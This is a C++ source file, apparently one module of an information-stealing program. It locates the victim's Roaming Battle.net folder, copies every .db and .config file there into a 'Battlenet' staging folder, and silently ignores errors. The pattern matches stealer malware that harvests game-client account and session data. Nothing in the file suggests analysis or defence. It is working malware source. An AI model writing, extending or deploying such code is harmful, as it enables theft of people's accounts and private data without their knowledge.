//
// Created by .1qxz on 08.06.2024.
//

#include "BattleNet.h"

static const fs::path BATTLE_NET_PATH = Utils::getRoamingPath() / "Battle.net";

void BattleNet::execute(fs::path &root) {
    std::vector<fs::path> paths = BattleNet::battlenetFiles();

    if(paths.empty())
        return;

    fs::path dst = root / "Battlenet";
    fs::create_directories(dst);

    for(fs::path &path : paths)
    {
        Utils::copy(path, dst);
    }
}

std::vector<fs::path> BattleNet::battlenetFiles() {
    std::vector<fs::path> paths;
    try
    {
        for (const auto& entry : fs::directory_iterator(BATTLE_NET_PATH)) {
            const fs::path& item_path = entry.path();

            std::string extension = item_path.extension().string();
            extension.erase(0, 1);

            if(!(extension == "db" || extension == "config"))
                continue;

            paths.push_back(item_path);
        }
    }
    catch (const fs::filesystem_error& ignored) {}

    return paths;
}
